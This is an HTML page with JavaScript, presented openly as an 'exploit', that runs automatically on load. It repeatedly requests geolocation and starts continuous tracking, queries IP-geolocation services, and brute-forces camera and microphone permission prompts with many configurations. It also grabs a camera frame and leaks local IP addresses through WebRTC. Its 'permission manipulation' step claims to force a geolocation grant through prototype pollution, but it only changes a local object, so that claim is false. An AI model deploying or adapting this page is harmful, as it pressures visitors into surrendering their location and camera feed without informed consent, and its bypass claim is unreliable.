<!DOCTYPE html>
<html>
<head>
    <title>Aggressive Location & Camera Exploit</title>
    <meta charset="utf-8">
    <style>
        body {
            font-family: 'Courier New', monospace;
            padding: 10px;
            background: #000;
            color: #00ff00;
            margin: 0;
            font-size: 10px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: rgba(0,20,0,0.9);
            padding: 15px;
            border-radius: 8px;
            border: 1px solid #00ff00;
        }
        .section {
            background: rgba(0,40,0,0.3);
            padding: 10px;
            margin: 8px 0;
            border-radius: 4px;
            border-left: 3px solid #ff0000;
        }
        .critical { border-left-color: #ff0000; }
        .warning { border-left-color: #ffff00; }
        .success { border-left-color: #00ff00; }
        button {
            background: #004400;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 4px 8px;
            border-radius: 3px;
            cursor: pointer;
            margin: 2px;
            font-family: inherit;
            font-size: 9px;
        }
        button:hover { background: #006600; }
        .log {
            background: #001100;
            padding: 8px;
            border-radius: 3px;
            font-family: inherit;
            margin: 5px 0;
            font-size: 9px;
            white-space: pre-wrap;
            max-height: 150px;
            overflow-y: auto;
            border: 1px solid #003300;
        }
        .exploit { color: #ff4444; font-weight: bold; }
        .data { color: #44ffff; }
        .success-text { color: #44ff44; }
        .warning-text { color: #ffff00; }
        #videoPreview { width: 200px; height: 150px; background: #333; margin: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>[!] AGGRESSIVE LOCATION & CAMERA EXPLOIT</h1>
        
        <div class="section critical">
            <h2>[!] Location Extraction Vectors</h2>
            <button onclick="bruteForceLocation()">Brute Force Location</button>
            <button onclick="tryIPGeolocation()">IP Geolocation</button>
            <button onclick="tryWiFiGeolocation()">WiFi Geolocation</button>
            <button onclick="tryTimeZoneLocation()">TimeZone Location</button>
            <button onclick="tryNetworkLocation()">Network Location</button>
            <div id="locationLog" class="log"></div>
        </div>

        <div class="section warning">
            <h2>[!] Camera Access Vectors</h2>
            <button onclick="bruteForcCamera()">Brute Force Camera</button>
            <button onclick="tryLegacyCamera()">Legacy Camera APIs</button>
            <button onclick="tryImageCapture()">Image Capture API</button>
            <button onclick="tryWebRTC()">WebRTC Camera</button>
            <button onclick="tryGetDisplayMedia()">Screen Capture</button>
            <video id="videoPreview" autoplay muted></video>
            <div id="cameraLog" class="log"></div>
        </div>

        <div class="section success">
            <h2>[+] Extracted Location Data</h2>
            <div id="locationData" class="log"></div>
        </div>

        <div class="section success">
            <h2>[+] Camera/Media Results</h2>
            <div id="mediaResults" class="log"></div>
        </div>
    </div>

    <script>
        let locationLog = document.getElementById('locationLog');
        let cameraLog = document.getElementById('cameraLog');
        let locationData = document.getElementById('locationData');
        let mediaResults = document.getElementById('mediaResults');
        let activeStream = null;

        function logLocation(message, type = 'info') {
            const colors = { 'info': '#00ff00', 'warning': '#ffff00', 'error': '#ff0000', 'success': '#44ff44', 'data': '#44ffff' };
            locationLog.innerHTML += `<span style="color: ${colors[type]}">[${new Date().toLocaleTimeString()}] ${message}</span>\n`;
            locationLog.scrollTop = locationLog.scrollHeight;
            console.log(message);
        }

        function logCamera(message, type = 'info') {
            const colors = { 'info': '#00ff00', 'warning': '#ffff00', 'error': '#ff0000', 'success': '#44ff44', 'data': '#44ffff' };
            cameraLog.innerHTML += `<span style="color: ${colors[type]}">[${new Date().toLocaleTimeString()}] ${message}</span>\n`;
            cameraLog.scrollTop = cameraLog.scrollHeight;
            console.log(message);
        }

        function displayLocationData(data) {
            locationData.innerHTML += `<span style="color: #44ffff">${JSON.stringify(data, null, 2)}</span>\n`;
            locationData.scrollTop = locationData.scrollHeight;
        }

        function displayMediaData(data) {
            mediaResults.innerHTML += `<span style="color: #44ffff">${JSON.stringify(data, null, 2)}</span>\n`;
            mediaResults.scrollTop = mediaResults.scrollHeight;
        }

        async function bruteForceLocation() {
            logLocation('[!] STARTING AGGRESSIVE LOCATION EXTRACTION...', 'error');
            
            // Strategy 1: Multiple geolocation attempts with different options
            const geoOptions = [
                { enableHighAccuracy: true, timeout: 1000, maximumAge: 0 },
                { enableHighAccuracy: false, timeout: 2000, maximumAge: 0 },
                { enableHighAccuracy: true, timeout: 5000, maximumAge: 300000 },
                { enableHighAccuracy: false, timeout: 10000, maximumAge: 600000 },
                { timeout: 15000, maximumAge: Infinity },
                { maximumAge: Infinity, timeout: 0 }, // Cached only
                {} // Default
            ];

            for (let i = 0; i < geoOptions.length; i++) {
                logLocation(`[+] Geo attempt ${i+1}: ${JSON.stringify(geoOptions[i])}`, 'info');
                
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, geoOptions[i]);
                    });
                    
                    logLocation(`[!] SUCCESS! Location obtained via strategy ${i+1}`, 'success');
                    const locationInfo = {
                        strategy: i+1,
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        heading: position.coords.heading,
                        speed: position.coords.speed,
                        timestamp: new Date(position.timestamp).toISOString()
                    };
                    
                    displayLocationData(locationInfo);
                    logLocation(`[!] COORDINATES: ${position.coords.latitude}, ${position.coords.longitude}`, 'data');
                    logLocation(`[!] ACCURACY: ${position.coords.accuracy}m`, 'data');
                    
                    // Start continuous tracking
                    startLocationTracking(geoOptions[i]);
                    return;
                    
                } catch (error) {
                    logLocation(`[!] Strategy ${i+1} failed: ${error.message} (Code: ${error.code})`, 'warning');
                }
                
                // Small delay between attempts
                await new Promise(resolve => setTimeout(resolve, 500));
            }
            
            logLocation('[!] All direct geolocation attempts failed', 'error');
            
            // Strategy 2: Try permission manipulation
            await tryPermissionManipulation();
        }

        async function tryPermissionManipulation() {
            logLocation('[+] Attempting permission manipulation...', 'warning');
            
            // Try to override permission state
            if (navigator.permissions) {
                try {
                    const permission = await navigator.permissions.query({name: 'geolocation'});
                    logLocation(`[+] Current geolocation permission: ${permission.state}`, 'info');
                    
                    // Try to force grant permission using prototype pollution
                    Object.defineProperty(permission, 'state', {
                        value: 'granted',
                        writable: true
                    });
                    
                    logLocation(`[+] Attempted to override permission to: ${permission.state}`, 'warning');
                    
                    // Try geolocation again after manipulation
                    setTimeout(() => {
                        navigator.geolocation.getCurrentPosition(
                            position => {
                                logLocation('[!] SUCCESS after permission manipulation!', 'success');
                                displayLocationData({
                                    method: 'permission_manipulation',
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude,
                                    accuracy: position.coords.accuracy
                                });
                            },
                            error => {
                                logLocation(`[!] Still denied after manipulation: ${error.message}`, 'error');
                            }
                        );
                    }, 1000);
                    
                } catch (e) {
                    logLocation(`[!] Permission query failed: ${e.message}`, 'error');
                }
            }
        }

        function startLocationTracking(options) {
            logLocation('[+] Starting continuous location tracking...', 'warning');
            
            const watchId = navigator.geolocation.watchPosition(
                position => {
                    logLocation(`[!] TRACKING UPDATE: ${position.coords.latitude}, ${position.coords.longitude}`, 'data');
                    displayLocationData({
                        type: 'tracking_update',
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: new Date().toISOString()
                    });
                },
                error => {
                    logLocation(`[!] Tracking error: ${error.message}`, 'warning');
                },
                options
            );
            
            // Stop tracking after 60 seconds
            setTimeout(() => {
                navigator.geolocation.clearWatch(watchId);
                logLocation('[+] Stopped location tracking', 'info');
            }, 60000);
        }

        async function tryIPGeolocation() {
            logLocation('[+] Attempting IP-based geolocation...', 'info');
            
            const ipServices = [
                'https://ipapi.co/json/',
                'https://api.ipify.org?format=json',
                'https://httpbin.org/ip',
                'https://api.myip.com',
                'https://ipinfo.io/json'
            ];
            
            for (const service of ipServices) {
                try {
                    logLocation(`[+] Trying ${service}...`, 'info');
                    const response = await fetch(service);
                    const data = await response.json();
                    
                    logLocation(`[!] IP service response received`, 'success');
                    displayLocationData({
                        method: 'ip_geolocation',
                        service: service,
                        data: data
                    });
                    
                    if (data.latitude && data.longitude) {
                        logLocation(`[!] LOCATION FROM IP: ${data.latitude}, ${data.longitude}`, 'data');
                    }
                    
                } catch (error) {
                    logLocation(`[!] ${service} failed: ${error.message}`, 'warning');
                }
            }
        }

        async function tryWiFiGeolocation() {
            logLocation('[+] Attempting WiFi-based location...', 'info');
            
            // Try to get network information
            if (navigator.connection) {
                const networkInfo = {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData
                };
                
                logLocation('[+] Network info obtained', 'info');
                displayLocationData({
                    method: 'network_analysis',
                    network: networkInfo
                });
            }
            
            // Try WebRTC to get local IPs
            try {
                const rtc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
                const ips = [];
                
                rtc.createDataChannel('');
                rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
                
                rtc.onicecandidate = function(event) {
                    if (event.candidate) {
                        const candidate = event.candidate.candidate;
                        const ip = candidate.split(' ')[4];
                        if (ip && ips.indexOf(ip) === -1) {
                            ips.push(ip);
                            logLocation(`[+] Local IP discovered: ${ip}`, 'data');
                            displayLocationData({
                                method: 'webrtc_ip',
                                ip: ip,
                                candidate: candidate
                            });
                        }
                    }
                };
                
            } catch (error) {
                logLocation(`[!] WebRTC IP discovery failed: ${error.message}`, 'warning');
            }
        }

        function tryTimeZoneLocation() {
            logLocation('[+] Extracting timezone-based location...', 'info');
            
            const timezoneData = {
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                offset: new Date().getTimezoneOffset(),
                locale: navigator.language,
                languages: navigator.languages
            };
            
            logLocation(`[+] Timezone: ${timezoneData.timezone}`, 'data');
            logLocation(`[+] UTC Offset: ${timezoneData.offset} minutes`, 'data');
            
            displayLocationData({
                method: 'timezone_analysis',
                ...timezoneData
            });
        }

        async function tryNetworkLocation() {
            logLocation('[+] Attempting network-based location discovery...', 'info');
            
            // Try to measure latency to different servers to triangulate location
            const servers = [
                'https://www.google.com/favicon.ico',
                'https://www.amazon.com/favicon.ico',
                'https://www.microsoft.com/favicon.ico',
                'https://www.apple.com/favicon.ico'
            ];
            
            const latencies = {};
            
            for (const server of servers) {
                try {
                    const start = performance.now();
                    await fetch(server, {mode: 'no-cors'});
                    const latency = performance.now() - start;
                    
                    const domain = new URL(server).hostname;
                    latencies[domain] = latency;
                    logLocation(`[+] Latency to ${domain}: ${latency.toFixed(2)}ms`, 'data');
                    
                } catch (error) {
                    logLocation(`[!] Failed to ping ${server}`, 'warning');
                }
            }
            
            displayLocationData({
                method: 'network_latency',
                latencies: latencies
            });
        }

        async function bruteForcCamera() {
            logCamera('[!] STARTING AGGRESSIVE CAMERA ACCESS...', 'error');
            
            // Strategy 1: Multiple getUserMedia configurations
            const mediaConfigs = [
                { video: true, audio: true },
                { video: { facingMode: 'user' }, audio: true },
                { video: { facingMode: 'environment' }, audio: true },
                { video: { width: 640, height: 480 } },
                { video: { width: 1280, height: 720 } },
                { video: { deviceId: 'default' } },
                { video: true },
                { audio: true },
                { video: { facingMode: { exact: 'user' } } },
                { video: { facingMode: { exact: 'environment' } } },
                { video: { mandatory: { minWidth: 640, minHeight: 480 } } }, // Legacy
            ];

            for (let i = 0; i < mediaConfigs.length; i++) {
                logCamera(`[+] Camera attempt ${i+1}: ${JSON.stringify(mediaConfigs[i])}`, 'info');
                
                try {
                    const stream = await navigator.mediaDevices.getUserMedia(mediaConfigs[i]);
                    
                    logCamera(`[!] SUCCESS! Camera access granted via config ${i+1}`, 'success');
                    
                    // Display video
                    const video = document.getElementById('videoPreview');
                    video.srcObject = stream;
                    
                    const tracks = stream.getTracks();
                    const mediaInfo = {
                        config: i+1,
                        videoTracks: tracks.filter(t => t.kind === 'video').length,
                        audioTracks: tracks.filter(t => t.kind === 'audio').length,
                        constraints: mediaConfigs[i]
                    };
                    
                    tracks.forEach(track => {
                        const settings = track.getSettings();
                        logCamera(`[!] ${track.kind} track: ${settings.width}x${settings.height}`, 'data');
                        mediaInfo[`${track.kind}_settings`] = settings;
                    });
                    
                    displayMediaData(mediaInfo);
                    
                    // Keep stream active for analysis
                    activeStream = stream;
                    
                    // Try to take a screenshot
                    setTimeout(() => takeScreenshot(stream), 2000);
                    
                    return;
                    
                } catch (error) {
                    logCamera(`[!] Config ${i+1} failed: ${error.message}`, 'warning');
                }
                
                await new Promise(resolve => setTimeout(resolve, 500));
            }
            
            logCamera('[!] All camera access attempts failed', 'error');
        }

        async function tryLegacyCamera() {
            logCamera('[+] Trying legacy camera APIs...', 'info');
            
            // Legacy getUserMedia
            const getUserMedia = navigator.getUserMedia || 
                               navigator.webkitGetUserMedia || 
                               navigator.mozGetUserMedia ||
                               navigator.msGetUserMedia;
            
            if (getUserMedia) {
                logCamera('[+] Legacy getUserMedia found', 'warning');
                
                const constraints = { video: true, audio: true };
                
                getUserMedia.call(navigator, constraints,
                    function(stream) {
                        logCamera('[!] SUCCESS via legacy getUserMedia!', 'success');
                        document.getElementById('videoPreview').srcObject = stream;
                        
                        displayMediaData({
                            method: 'legacy_getUserMedia',
                            stream: stream.id,
                            tracks: stream.getTracks().length
                        });
                        
                        activeStream = stream;
                    },
                    function(error) {
                        logCamera(`[!] Legacy getUserMedia failed: ${error.message}`, 'warning');
                    }
                );
            } else {
                logCamera('[!] No legacy getUserMedia available', 'error');
            }
        }

        async function tryImageCapture() {
            logCamera('[+] Trying ImageCapture API...', 'info');
            
            if (activeStream) {
                try {
                    const videoTrack = activeStream.getVideoTracks()[0];
                    const imageCapture = new ImageCapture(videoTrack);
                    
                    // Take photo
                    const photo = await imageCapture.takePhoto();
                    logCamera('[!] Photo captured successfully!', 'success');
                    
                    // Get photo capabilities
                    const capabilities = await imageCapture.getPhotoCapabilities();
                    logCamera(`[+] Photo capabilities: ${JSON.stringify(capabilities)}`, 'data');
                    
                    displayMediaData({
                        method: 'image_capture',
                        photo_size: photo.size,
                        photo_type: photo.type,
                        capabilities: capabilities
                    });
                    
                } catch (error) {
                    logCamera(`[!] ImageCapture failed: ${error.message}`, 'warning');
                }
            } else {
                logCamera('[!] No active stream for ImageCapture', 'error');
            }
        }

        async function tryWebRTC() {
            logCamera('[+] Trying WebRTC camera access...', 'info');
            
            try {
                const pc = new RTCPeerConnection();
                
                // Add a video track
                const stream = await navigator.mediaDevices.getUserMedia({video: true});
                stream.getTracks().forEach(track => {
                    pc.addTrack(track, stream);
                    logCamera(`[!] Added ${track.kind} track to WebRTC`, 'success');
                });
                
                document.getElementById('videoPreview').srcObject = stream;
                activeStream = stream;
                
                displayMediaData({
                    method: 'webrtc_camera',
                    tracks: stream.getTracks().length,
                    stream_id: stream.id
                });
                
            } catch (error) {
                logCamera(`[!] WebRTC camera failed: ${error.message}`, 'warning');
            }
        }

        async function tryGetDisplayMedia() {
            logCamera('[+] Trying screen capture...', 'info');
            
            if (navigator.mediaDevices.getDisplayMedia) {
                try {
                    const stream = await navigator.mediaDevices.getDisplayMedia({video: true});
                    
                    logCamera('[!] Screen capture successful!', 'success');
                    document.getElementById('videoPreview').srcObject = stream;
                    
                    displayMediaData({
                        method: 'screen_capture',
                        tracks: stream.getTracks().length,
                        stream_id: stream.id
                    });
                    
                    activeStream = stream;
                    
                } catch (error) {
                    logCamera(`[!] Screen capture failed: ${error.message}`, 'warning');
                }
            } else {
                logCamera('[!] getDisplayMedia not available', 'error');
            }
        }

        function takeScreenshot(stream) {
            logCamera('[+] Attempting to take screenshot...', 'warning');
            
            try {
                const video = document.getElementById('videoPreview');
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                
                ctx.drawImage(video, 0, 0);
                
                // Convert to data URL
                const dataURL = canvas.toDataURL('image/png');
                logCamera(`[!] Screenshot captured! Size: ${dataURL.length} bytes`, 'success');
                
                displayMediaData({
                    method: 'screenshot',
                    size_bytes: dataURL.length,
                    dimensions: `${canvas.width}x${canvas.height}`,
                    timestamp: new Date().toISOString()
                });
                
                // Log first 100 chars of data URL as proof
                logCamera(`[+] Data URL preview: ${dataURL.substring(0, 100)}...`, 'data');
                
            } catch (error) {
                logCamera(`[!] Screenshot failed: ${error.message}`, 'warning');
            }
        }

        // Auto-execute on load
        window.onload = function() {
            logLocation('[!] AGGRESSIVE LOCATION & CAMERA EXPLOIT LOADED', 'error');
            logCamera('[!] READY FOR CAMERA EXPLOITATION', 'error');
            
            // Auto-run location extraction
            setTimeout(() => {
                bruteForceLocation();
                tryIPGeolocation();
                tryTimeZoneLocation();
            }, 1000);
            
            // Auto-run camera exploitation
            setTimeout(() => {
                bruteForcCamera();
            }, 3000);
        };
    </script>
</body>
</html>
